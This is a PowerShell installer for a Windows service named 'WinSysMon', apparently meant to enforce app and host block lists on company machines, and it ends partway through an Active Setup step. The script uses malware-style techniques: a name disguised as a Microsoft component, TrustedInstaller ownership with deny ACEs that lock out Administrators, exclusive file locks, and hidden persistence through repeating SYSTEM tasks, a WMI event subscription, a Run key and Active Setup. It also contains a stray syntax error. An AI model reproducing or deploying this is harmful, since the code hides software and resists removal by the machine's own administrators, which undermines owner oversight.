# ============================================================
#  install-service.ps1 - Instala WinSysMon como SERVICO WINDOWS
#  Aparece em services.msc
#  Compila wrapper C# nativo que chama o winsysmon.ps1 -RunLoop
# ============================================================
#Requires -RunAsAdministrator

param(
    [switch]$Uninstall,
    [string]$SharePath = "\\srv-105\Sistema de monitoramento\gpo\aaa\service\blocked-apps.json",
    [string]$HostsSharePath = "\\srv-105\Sistema de monitoramento\gpo\aaa\service\blocked-hosts.json",
    [string]$PoliciesSharePath = "\\srv-105\Sistema de monitoramento\gpo\aaa\service\blocked-policies.json"
)

$ErrorActionPreference = "Stop"
$serviceName = "WinSysMon"
$displayName = "Windows System Monitor"
$description = "Monitors system performance and enforces application policies."
$installDir  = "$env:ProgramData\Microsoft\WinSysMon"
$exePath     = Join-Path $installDir "WinSysMonSvc.exe"
$psScript    = Join-Path $installDir "winsysmon.ps1"
$configPath  = Join-Path $installDir "sysmon-config.json"
$installLog  = Join-Path $installDir "install.log"

# ---- Garantir diretorio (para log) ----
if (-not (Test-Path $installDir)) { New-Item $installDir -ItemType Directory -Force | Out-Null }

function Write-InstallLog {
    param([string]$Msg, [string]$Level = "INFO")
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$ts] [$Level] $Msg"
    try { Add-Content -Path $installLog -Value $line -ErrorAction SilentlyContinue } catch {}
    $color = switch ($Level) { "ERROR" {"Red"} "WARN" {"Yellow"} "OK" {"Green"} default {"Gray"} }
    Write-Host $line -ForegroundColor $color
}

function Test-Admin {
    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $p = New-Object System.Security.Principal.WindowsPrincipal($id)
    return $p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Admin)) {
    Write-InstallLog "Este script precisa rodar como ADMINISTRADOR" "ERROR"
    exit 1
}

# ══════════════════════════════════════════════════════════════
#  HELPERS DE BLINDAGEM (TrustedInstaller + DENY ACEs)
# ══════════════════════════════════════════════════════════════
# Garante o servico TrustedInstaller rodando (necessario para resolver a conta)
try {
    $ti = Get-Service -Name TrustedInstaller -ErrorAction SilentlyContinue
    if ($ti -and $ti.Status -ne 'Running') { Start-Service TrustedInstaller -ErrorAction SilentlyContinue }
} catch {}

function Get-TrustedInstallerSid {
    try {
        $n = New-Object System.Security.Principal.NTAccount("NT SERVICE\TrustedInstaller")
        return $n.Translate([System.Security.Principal.SecurityIdentifier])
    } catch { return $null }
}

function Enable-Privilege {
    param([string]$Privilege)
    $sig = @'
using System;
using System.Runtime.InteropServices;
public class Priv {
  [StructLayout(LayoutKind.Sequential, Pack=1)] public struct TokPriv1Luid { public int Count; public long Luid; public int Attr; }
  public const int SE_PRIVILEGE_ENABLED = 2;
  public const int TOKEN_ADJUST_PRIVILEGES = 32;
  public const int TOKEN_QUERY = 8;
  [DllImport("advapi32.dll", SetLastError=true)] public static extern bool AdjustTokenPrivileges(IntPtr ht, bool all, ref TokPriv1Luid tp, int bl, IntPtr pl, IntPtr rl);
  [DllImport("advapi32.dll", SetLastError=true)] public static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr p);
  [DllImport("advapi32.dll", SetLastError=true)] public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
  [DllImport("kernel32.dll")] public static extern IntPtr GetCurrentProcess();
}
'@
    if (-not ("Priv" -as [type])) { Add-Type -TypeDefinition $sig }
    $tp = New-Object Priv+TokPriv1Luid
    $tp.Count = 1; $tp.Luid = 0; $tp.Attr = [Priv]::SE_PRIVILEGE_ENABLED
    $hTok = [IntPtr]::Zero
    [void][Priv]::OpenProcessToken([Priv]::GetCurrentProcess(), [Priv]::TOKEN_ADJUST_PRIVILEGES -bor [Priv]::TOKEN_QUERY, [ref]$hTok)
    [void][Priv]::LookupPrivilegeValue($null, $Privilege, [ref]$tp.Luid)
    [void][Priv]::AdjustTokenPrivileges($hTok, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero)
}

function Harden-FileSystem {
    param([string]$Path, [switch]$ReadOnly)
    if (-not (Test-Path $Path)) { return }
    try { Enable-Privilege "SeTakeOwnershipPrivilege"; Enable-Privilege "SeRestorePrivilege"; Enable-Privilege "SeBackupPrivilege" } catch {}
    $sidTI  = Get-TrustedInstallerSid
    $sidSys = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::LocalSystemSid, $null)
    $sidAdm = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid, $null)
    $sidUsr = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinUsersSid, $null)
    $sidEvr = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::WorldSid, $null)

    $isDir = (Get-Item $Path -Force).PSIsContainer
    try {
        if ($isDir) { & takeown.exe /F $Path /R /D Y /A 2>&1 | Out-Null } else { & takeown.exe /F $Path /A 2>&1 | Out-Null }
    } catch {}

    if ($isDir) {
        $acl = New-Object System.Security.AccessControl.DirectorySecurity
    } else {
        $acl = New-Object System.Security.AccessControl.FileSecurity
    }
    $acl.SetAccessRuleProtection($true, $false)
    $inh  = if ($isDir) { [System.Security.AccessControl.InheritanceFlags]"ContainerInherit,ObjectInherit" } else { [System.Security.AccessControl.InheritanceFlags]::None }
    $prop = [System.Security.AccessControl.PropagationFlags]::None

    # ALLOW: SYSTEM + TrustedInstaller = FullControl
    $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sidSys,"FullControl",$inh,$prop,"Allow")))
    if ($sidTI) { $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sidTI,"FullControl",$inh,$prop,"Allow"))) }

    # ALLOW: Administrators = ReadAndExecute apenas
    $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sidAdm,"ReadAndExecute",$inh,$prop,"Allow")))

    # DENY EXPLICITO: Administrators NAO pode deletar nem mudar permissoes
    $denyRights = [System.Security.AccessControl.FileSystemRights]"Delete,DeleteSubdirectoriesAndFiles,ChangePermissions,TakeOwnership,WriteAttributes,WriteExtendedAttributes,Write"
    $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sidAdm,$denyRights,$inh,$prop,"Deny")))

    # DENY para Users/Everyone: tudo (nem listar)
    $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sidUsr,"FullControl",$inh,$prop,"Deny")))

    # Owner = TrustedInstaller (so TI ou alguem que roube ownership consegue mudar)
    if ($sidTI) { try { $acl.SetOwner($sidTI) } catch {} }

    Set-Acl -Path $Path -AclObject $acl

    # Atributos: ReadOnly + Hidden + System
    try {
        Get-ChildItem $Path -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                if ($ReadOnly) {
                    $_.Attributes = $_.Attributes -bor [System.IO.FileAttributes]::ReadOnly -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
                } else {
                    $_.Attributes = $_.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
                }
            } catch {}
        }
        $r = Get-Item $Path -Force
        $r.Attributes = $r.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
    } catch {}
}

function Harden-RegistryKey {
    param([string]$Path)
    if (-not (Test-Path $Path)) { return }
    try {
        $sidTI  = Get-TrustedInstallerSid
        $sidSys = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::LocalSystemSid, $null)
        $sidAdm = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid, $null)
        $sidUsr = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinUsersSid, $null)

        $key = Get-Item $Path
        $acl = $key.GetAccessControl()
        $acl.SetAccessRuleProtection($true,$false)
        foreach ($r in @($acl.Access)) { [void]$acl.RemoveAccessRule($r) }
        $inh = [System.Security.AccessControl.InheritanceFlags]"ContainerInherit,ObjectInherit"
        $prop = [System.Security.AccessControl.PropagationFlags]::None

        $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($sidSys,"FullControl",$inh,$prop,"Allow")))
        if ($sidTI) { $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($sidTI,"FullControl",$inh,$prop,"Allow"))) }
        $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($sidAdm,"ReadKey",$inh,$prop,"Allow")))
        # DENY: Admins nao podem deletar/mudar ACL
        $denyReg = [System.Security.AccessControl.RegistryRights]"Delete,ChangePermissions,TakeOwnership,SetValue,CreateSubKey"
        $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($sidAdm,$denyReg,$inh,$prop,"Deny")))
        $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($sidUsr,"FullControl",$inh,$prop,"Deny")))
        if ($sidTI) { try { $acl.SetOwner($sidTI) } catch {} }
        Set-Acl -Path $Path -AclObject $acl
    } catch { Write-InstallLog "Harden registry $Path : $($_.Exception.Message)" "WARN" }
}

Write-InstallLog "=== Instalador $serviceName em $env:COMPUTERNAME ===" "OK"

# ---- Uninstall ----
if ($Uninstall) {
    Write-InstallLog "Modo desinstalar"
    try { Stop-Service $serviceName -Force -ErrorAction SilentlyContinue } catch {}
    & sc.exe delete $serviceName | Out-Null
    try { Unregister-ScheduledTask -TaskName "WinSysMonWatchdog" -Confirm:$false -ErrorAction SilentlyContinue } catch {}
    try { Unregister-ScheduledTask -TaskName "WinSysMonGuard"    -Confirm:$false -ErrorAction SilentlyContinue } catch {}
    try {
        $ns = "root\subscription"
        Get-CimInstance -Namespace $ns -ClassName __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object { $_.Filter.Name -eq "WinSysMonFilter" } | Remove-CimInstance -ErrorAction SilentlyContinue
        Get-CimInstance -Namespace $ns -ClassName __EventFilter -Filter "Name='WinSysMonFilter'" -ErrorAction SilentlyContinue | Remove-CimInstance -ErrorAction SilentlyContinue
        Get-CimInstance -Namespace $ns -ClassName CommandLineEventConsumer -Filter "Name='WinSysMonConsumer'" -ErrorAction SilentlyContinue | Remove-CimInstance -ErrorAction SilentlyContinue
    } catch {}
    try { Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WinSysMonBoot" -ErrorAction SilentlyContinue } catch {}
    try { Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{A7C8B9D0-1234-5678-ABCD-WINSYSMON00}" -Recurse -Force -ErrorAction SilentlyContinue } catch {}
    Start-Sleep 1
    Write-InstallLog "Servico, watchdog, guard, WMI, registry e active setup removidos" "OK"
    exit 0
}

# ---- Resolver fonte do winsysmon.ps1 ----
$sourceScript = $null
$candidates = @(1
    (Join-Path $PSScriptRoot "winsysmon.ps1"),
    "\\srv-105\Sistema de monitoramento\gpo\aaa\service\winsysmon.ps1",
    "c:\gpo\service\winsysmon.ps1"
)
foreach ($c in $candidates) {
    try { if ($c -and (Test-Path $c -ErrorAction Stop)) { $sourceScript = $c; break } } catch {}
}
if (-not $sourceScript) {
    Write-InstallLog "winsysmon.ps1 nao encontrado em nenhum candidato" "ERROR"
    exit 1
}
Write-InstallLog "Fonte do script: $sourceScript"

# Validar sintaxe antes de copiar
try {
    $parseErrs = $null
    $null = [System.Management.Automation.Language.Parser]::ParseFile($sourceScript, [ref]$null, [ref]$parseErrs)
    if ($parseErrs -and $parseErrs.Count -gt 0) {
        Write-InstallLog "Script de origem tem $($parseErrs.Count) erros de sintaxe - ABORTANDO" "ERROR"
        $parseErrs | Select-Object -First 3 | ForEach-Object { Write-InstallLog ("  " + $_.Message) "ERROR" }
        exit 1
    }
} catch {
    Write-InstallLog "Falha ao validar sintaxe: $($_.Exception.Message)" "WARN"
}

# ---- Copiar winsysmon.ps1 ----
try {
    Copy-Item $sourceScript $psScript -Force -ErrorAction Stop
    Write-InstallLog "Script copiado: $psScript" "OK"
} catch {
    Write-InstallLog "Falha ao copiar script: $($_.Exception.Message)" "ERROR"
    exit 1
}

# ---- Config (preserva existente, merge com SharePath atualizado) ----
$defaultCfg = @{
    BlockedApps             = @()
    PollInterval            = 1
    MonitorLogins           = $true
    MonitorApps             = $true
    CollectHardware         = $true
    HardwareInterval        = 3600
    RemoteBlockedAppsPath   = $SharePath
    RemoteBlockedHostsPath  = $HostsSharePath
    RemoteBlockedPoliciesPath = $PoliciesSharePath
    HostBlockingEnabled     = $true
    HostBlockingInterval    = 60
    PolicyBlockingEnabled   = $true
    PolicyBlockingInterval  = 60
}
$finalCfg = $defaultCfg.Clone()
if (Test-Path $configPath) {
    try {
        $existing = Get-Content $configPath -Raw -ErrorAction Stop | ConvertFrom-Json
        foreach ($p in $existing.PSObject.Properties) { $finalCfg[$p.Name] = $p.Value }
        Write-InstallLog "Config existente preservada"
    } catch {
        Write-InstallLog "Config corrompida - recriando com defaults" "WARN"
    }
}
# Campos criticos sempre force defaults (evita configs antigas ruins)
$finalCfg.PollInterval = 1
if ($SharePath)      { $finalCfg.RemoteBlockedAppsPath  = $SharePath }
if ($HostsSharePath) { $finalCfg.RemoteBlockedHostsPath = $HostsSharePath }
if ($PoliciesSharePath) { $finalCfg.RemoteBlockedPoliciesPath = $PoliciesSharePath }
try {
    $json = $finalCfg | ConvertTo-Json -Depth 5
    [System.IO.File]::WriteAllText($configPath, $json, (New-Object System.Text.UTF8Encoding($false)))
    Write-InstallLog "Config salva: RemoteBlockedAppsPath=$($finalCfg.RemoteBlockedAppsPath) RemoteBlockedHostsPath=$($finalCfg.RemoteBlockedHostsPath) PollInterval=$($finalCfg.PollInterval)"
} catch {
    Write-InstallLog "Falha ao salvar config: $($_.Exception.Message)" "ERROR"
    exit 1
}

# ---- Parar e remover servico anterior ----
if (Get-Service $serviceName -ErrorAction SilentlyContinue) {
    Write-InstallLog "Parando servico existente..."
    try { Stop-Service $serviceName -Force -ErrorAction SilentlyContinue } catch {}
    # Aguarda parar (ate 10s)
    for ($i = 0; $i -lt 10; $i++) {
        $s = Get-Service $serviceName -ErrorAction SilentlyContinue
        if (-not $s -or $s.Status -eq 'Stopped') { break }
        Start-Sleep 1
    }
    & sc.exe delete $serviceName | Out-Null
    Start-Sleep 2
}

# ---- Remover tarefa agendada legada ----
try {
    if (Get-ScheduledTask -TaskName $serviceName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $serviceName -Confirm:$false -ErrorAction SilentlyContinue
        Write-InstallLog "Tarefa agendada legada removida"
    }
} catch {}

# ---- Compilar wrapper C# (apenas se ainda nao existe ou se forcar) ----
# v2: wrapper com file-lock em arquivos criticos (impede delecao enquanto roda)
$wrapperVersion = "v2"
$wrapperMarker = Join-Path $installDir "wrapper.version"
$currentVer = ""
if (Test-Path $wrapperMarker) { try { $currentVer = (Get-Content $wrapperMarker -Raw -ErrorAction SilentlyContinue).Trim() } catch {} }
$needsCompile = (-not (Test-Path $exePath)) -or ($currentVer -ne $wrapperVersion)
if ($needsCompile) {
    Write-InstallLog "Compilando wrapper de servico ($wrapperVersion)..."

    $source = @'
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.ServiceProcess;
using System.Threading;

namespace WinSysMonSvc
{
    public class Service : ServiceBase
    {
        private Process _child;
        private Thread _watchdog;
        private Thread _lockKeeper;
        private volatile bool _stopping;
        private string _installDir;
        private string _psScript;
        private string _logFile;
        private int _restartBackoff = 5000;
        private List<FileStream> _locks = new List<FileStream>();

        public Service()
        {
            this.ServiceName = "WinSysMon";
            this.CanStop = true;
            this.CanShutdown = true;
        }

        private void Log(string msg)
        {
            try { File.AppendAllText(_logFile, "[" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "] [SVC] " + msg + Environment.NewLine); } catch { }
        }

        private void AcquireFileLocks()
        {
            // Abre handles exclusivos (sem FileShare.Delete) nos arquivos criticos.
            // Enquanto o servico roda, nem SYSTEM consegue deletar estes arquivos.
            string[] critical = new string[] {
                "winsysmon.ps1",
                Path.GetFileName(System.Reflection.Assembly.GetExecutingAssembly().Location),
                "sysmon-config.json"
            };
            foreach (var f in critical)
            {
                string path = Path.Combine(_installDir, f);
                try
                {
                    if (!File.Exists(path)) continue;
                    // FileShare.Read permite leitura; NAO inclui Delete -> delete vai falhar
                    var fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read);
                    _locks.Add(fs);
                    Log("Lock adquirido em " + f);
                }
                catch (Exception ex) { Log("Falha ao travar " + f + ": " + ex.Message); }
            }
        }

        private void ReleaseFileLocks()
        {
            foreach (var fs in _locks) { try { fs.Close(); } catch { } }
            _locks.Clear();
        }

        private void RunLockKeeper()
        {
            // Se algum arquivo critico for recriado (self-heal do script), re-trava.
            while (!_stopping)
            {
                try
                {
                    string[] critical = new string[] {
                        "winsysmon.ps1",
                        Path.GetFileName(System.Reflection.Assembly.GetExecutingAssembly().Location),
                        "sysmon-config.json"
                    };
                    // Remove handles cujos arquivos nao existem mais
                    _locks.RemoveAll(fs => { try { return !File.Exists(fs.Name); } catch { return true; } });
                    foreach (var f in critical)
                    {
                        string path = Path.Combine(_installDir, f);
                        if (!File.Exists(path)) continue;
                        bool already = false;
                        foreach (var fs in _locks) { if (string.Equals(fs.Name, path, StringComparison.OrdinalIgnoreCase)) { already = true; break; } }
                        if (already) continue;
                        try
                        {
                            var nfs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read);
                            _locks.Add(nfs);
                            Log("Lock re-adquirido em " + f);
                        }
                        catch { }
                    }
                }
                catch { }
                Thread.Sleep(10000);
            }
        }

        protected override void OnStart(string[] args)
        {
            _installDir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
            _psScript   = Path.Combine(_installDir, "winsysmon.ps1");
            _logFile    = Path.Combine(_installDir, "sysmon.log");
            _stopping   = false;

            Log("Servico iniciando (PID=" + Process.GetCurrentProcess().Id + ")");
            AcquireFileLocks();
            _lockKeeper = new Thread(RunLockKeeper);
            _lockKeeper.IsBackground = true;
            _lockKeeper.Start();
            _watchdog = new Thread(RunWatchdog);
            _watchdog.IsBackground = true;
            _watchdog.Start();
        }

        private void RunWatchdog()
        {
            int consecutiveFastExits = 0;
            while (!_stopping)
            {
                DateTime startedAt = DateTime.Now;
                try
                {
                    if (!File.Exists(_psScript))
                    {
                        Log("Script nao encontrado: " + _psScript + " - aguardando 30s");
                        Thread.Sleep(30000);
                        continue;
                    }
                    var psi = new ProcessStartInfo();
                    psi.FileName = "powershell.exe";
                    psi.Arguments = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -File \"" + _psScript + "\" -RunLoop";
                    psi.UseShellExecute = false;
                    psi.CreateNoWindow = true;
                    psi.WorkingDirectory = _installDir;
                    psi.RedirectStandardOutput = true;
                    psi.RedirectStandardError = true;

                    _child = Process.Start(psi);
                    Log("PowerShell iniciado PID=" + _child.Id);
                    _child.WaitForExit();
                    Log("PowerShell terminou exitCode=" + _child.ExitCode);
                }
                catch (Exception ex)
                {
                    Log("Erro watchdog: " + ex.Message);
                }

                if (_stopping) break;

                // Backoff exponencial se ficar caindo rapido (max 5min)
                TimeSpan uptime = DateTime.Now - startedAt;
                if (uptime.TotalSeconds < 30) {
                    consecutiveFastExits++;
                    _restartBackoff = Math.Min(_restartBackoff * 2, 300000);
                    Log("Script caiu rapido (" + uptime.TotalSeconds + "s). Backoff=" + _restartBackoff + "ms (falhas seguidas=" + consecutiveFastExits + ")");
                } else {
                    consecutiveFastExits = 0;
                    _restartBackoff = 5000;
                }
                Thread.Sleep(_restartBackoff);
            }
        }

        protected override void OnStop()
        {
            Log("Servico parando...");
            _stopping = true;
            try
            {
                if (_child != null && !_child.HasExited)
                {
                    _child.Kill();
                    _child.WaitForExit(5000);
                }
            }
            catch { }
            ReleaseFileLocks();
        }

        protected override void OnShutdown() { OnStop(); }

        public static void Main() { ServiceBase.Run(new Service()); }
    }
}
'@

    $srcFile = Join-Path $installDir "WinSysMonSvc.cs"
    [System.IO.File]::WriteAllText($srcFile, $source, (New-Object System.Text.UTF8Encoding($false)))

    $cscPaths = @(
        "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
        "$env:WINDIR\Microsoft.NET\Framework\v4.0.30319\csc.exe"
    )
    $csc = $cscPaths | Where-Object { Test-Path $_ } | Select-Object -First 1
    if (-not $csc) {
        Write-InstallLog "csc.exe (.NET 4) nao encontrado. Instale .NET Framework 4.x" "ERROR"
        exit 1
    }

    if (Test-Path $exePath) {
        try { Remove-Item $exePath -Force -ErrorAction Stop } catch {
            Write-InstallLog "Nao foi possivel substituir $exePath (em uso?): $($_.Exception.Message)" "ERROR"
            exit 1
        }
    }
    $cscArgs = @("/nologo", "/target:exe", "/out:$exePath", "/r:System.ServiceProcess.dll", $srcFile)
    $p = Start-Process -FilePath $csc -ArgumentList $cscArgs -Wait -PassThru -NoNewWindow -RedirectStandardOutput "$installDir\csc.out.log" -RedirectStandardError "$installDir\csc.err.log"
    if ($p.ExitCode -ne 0 -or -not (Test-Path $exePath)) {
        Write-InstallLog "Falha na compilacao (exit=$($p.ExitCode))" "ERROR"
        if (Test-Path "$installDir\csc.err.log") { Get-Content "$installDir\csc.err.log" | ForEach-Object { Write-InstallLog "  $_" "ERROR" } }
        exit 1
    }
    Remove-Item $srcFile -Force -ErrorAction SilentlyContinue
    Remove-Item "$installDir\csc.out.log" -Force -ErrorAction SilentlyContinue
    Remove-Item "$installDir\csc.err.log" -Force -ErrorAction SilentlyContinue
    try { Set-Content -Path $wrapperMarker -Value $wrapperVersion -Encoding ASCII -Force } catch {}
    Write-InstallLog "Compilado: $exePath ($wrapperVersion)" "OK"
} else {
    Write-InstallLog "Wrapper ja existe - reutilizando $exePath"
}

# ---- Criar servico ----
Write-InstallLog "Registrando servico..."
$scOut = & sc.exe create $serviceName binPath= "`"$exePath`"" start= auto DisplayName= "$displayName" 2>&1
if ($LASTEXITCODE -ne 0) {
    Write-InstallLog "sc.exe create falhou: $scOut" "ERROR"
    exit 1
}
& sc.exe description $serviceName "$description" | Out-Null
& sc.exe failure $serviceName reset= 86400 actions= restart/5000/restart/10000/restart/30000 | Out-Null
& sc.exe sdset $serviceName "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)" | Out-Null
# Recovery MAIS agressivo: reset=0 (nunca zera contador), restart=1s sempre, failure em erro grave
& sc.exe failure $serviceName reset= 0 actions= restart/1000/restart/1000/restart/1000 | Out-Null
& sc.exe failureflag $serviceName 1 | Out-Null
& sc.exe config $serviceName start= auto error= normal | Out-Null
# Service SID type: unrestricted (isolacao de processo)
try { & sc.exe sidtype $serviceName unrestricted | Out-Null } catch {}
# Trigger: iniciar quando stack TCP/IP ficar disponivel (mesmo que start nao seja auto)
try { & sc.exe triggerinfo $serviceName start/networkon | Out-Null } catch {}

# ---- ACL na pasta (TrustedInstaller owner + DENY para Admins) ----
try {
    Harden-FileSystem -Path $installDir
    Write-InstallLog "ACL endurecida: Owner=TrustedInstaller, SYSTEM+TI=Full, Admins=Read+DENY delete" "OK"
} catch { Write-InstallLog "Harden-FileSystem: $($_.Exception.Message)" "WARN" }

# ---- Watchdog: scheduled task externa que reinstala se a pasta sumir ----
try {
    $wdTask = "WinSysMonWatchdog"
    $shInst = "\\srv-105\Sistema de monitoramento\gpo\aaa\service\install-service.ps1"
    $shAgt  = "\\srv-105\Sistema de monitoramento\gpo\aaa\service\winsysmon.ps1"
    $wdCmd  = "`$ErrorActionPreference='SilentlyContinue'; `$dir=`"`$env:ProgramData\Microsoft\WinSysMon`"; `$scr=`"`$dir\winsysmon.ps1`"; `$need=`$false; `$svc=Get-Service WinSysMon -ErrorAction SilentlyContinue; if (-not (Test-Path `$scr)) { `$need=`$true }; if (-not `$svc) { `$need=`$true } elseif (`$svc.Status -ne 'Running') { try { Start-Service WinSysMon -ErrorAction Stop } catch { `$need=`$true } }; if (`$need) { if (Test-Path '$shInst') { & powershell -NoProfile -ExecutionPolicy Bypass -File '$shInst' } elseif (Test-Path '$shAgt') { New-Item `$dir -ItemType Directory -Force | Out-Null; Copy-Item '$shAgt' `$scr -Force; & powershell -NoProfile -ExecutionPolicy Bypass -File `$scr -Install } }"
    try { Unregister-ScheduledTask -TaskName $wdTask -Confirm:$false -ErrorAction SilentlyContinue } catch {}
    $action    = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$wdCmd`""
    $trigger1  = New-ScheduledTaskTrigger -AtStartup
    $trigger2  = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration ([TimeSpan]::FromDays(3650))
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew -ExecutionTimeLimit (New-TimeSpan -Minutes 10)
    Register-ScheduledTask -TaskName $wdTask -Action $action -Trigger @($trigger1,$trigger2) -Principal $principal -Settings $settings -Force | Out-Null
    Write-InstallLog "Watchdog task '$wdTask' registrada (AtStartup + 1 min)" "OK"
} catch { Write-InstallLog "Watchdog task falhou: $($_.Exception.Message)" "WARN" }

# ---- Guard task: segunda task com nome/trigger diferente ----
try {
    $gdTask = "WinSysMonGuard"
    try { Unregister-ScheduledTask -TaskName $gdTask -Confirm:$false -ErrorAction SilentlyContinue } catch {}
    $actionG   = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$wdCmd`""
    $trgG1     = New-ScheduledTaskTrigger -AtLogOn
    $trgG2     = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(2) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration ([TimeSpan]::FromDays(3650))
    $prinG     = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $setG      = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew -ExecutionTimeLimit (New-TimeSpan -Minutes 10)
    Register-ScheduledTask -TaskName $gdTask -Action $actionG -Trigger @($trgG1,$trgG2) -Principal $prinG -Settings $setG -Force | Out-Null
    Write-InstallLog "Guard task '$gdTask' registrada (AtLogOn + 2 min)" "OK"
} catch { Write-InstallLog "Guard task falhou: $($_.Exception.Message)" "WARN" }

# ---- WMI Permanent Event Subscription (persiste fora do filesystem) ----
try {
    $ns = "root\subscription"
    $fname = "WinSysMonFilter"; $cname = "WinSysMonConsumer"
    $query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 5"
    $cmdLine = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$wdCmd`""
    # Cleanup antigo
    Get-CimInstance -Namespace $ns -ClassName __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object { $_.Filter.Name -eq $fname } | Remove-CimInstance -ErrorAction SilentlyContinue
    Get-CimInstance -Namespace $ns -ClassName __EventFilter -Filter "Name='$fname'" -ErrorAction SilentlyContinue | Remove-CimInstance -ErrorAction SilentlyContinue
    Get-CimInstance -Namespace $ns -ClassName CommandLineEventConsumer -Filter "Name='$cname'" -ErrorAction SilentlyContinue | Remove-CimInstance -ErrorAction SilentlyContinue
    $flt = New-CimInstance -Namespace $ns -ClassName __EventFilter -Property @{Name=$fname;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$query} -ErrorAction Stop
    $cns = New-CimInstance -Namespace $ns -ClassName CommandLineEventConsumer -Property @{Name=$cname;CommandLineTemplate=$cmdLine;RunInteractively=$false} -ErrorAction Stop
    New-CimInstance -Namespace $ns -ClassName __FilterToConsumerBinding -Property @{Filter=[ref]$flt;Consumer=[ref]$cns} -ErrorAction Stop | Out-Null
    Write-InstallLog "WMI persistence registrada ($fname + $cname)" "OK"
} catch { Write-InstallLog "WMI persistence falhou: $($_.Exception.Message)" "WARN" }

# ---- Canal 6: Registry Run (HKLM) ----
try {
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    $regName = "WinSysMonBoot"
    $regCmd  = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$wdCmd`""
    if (-not (Test-Path $regPath)) { New-Item $regPath -Force | Out-Null }
    Set-ItemProperty -Path $regPath -Name $regName -Value $regCmd -Force
    Write-InstallLog "Registry Run ($regName) registrada" "OK"
} catch { Write-InstallLog "Registry Run falhou: $($_.Exception.Message)" "WARN" }

# ---- Canal 7: Active Setup (dispara em cada logon de usuario, uma unica vez por perfil) ----
try {
    $asPath = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{A7C8B9D0-1234-5678-ABCD-WINSYSMON00}"
    if (-not (Test-Path $asPath)) { New-Item $asPath -Force | Out-Null }
    Set-ItemProperty -Path $asPath -Name "(default)"    -Value "WinSysMon Bootstrap"
    Set-ItemProperty -Path $asPath -Name "Version"      -Value "1,0,0,$(Get-Date -Format yyyyMMddHHmm)"
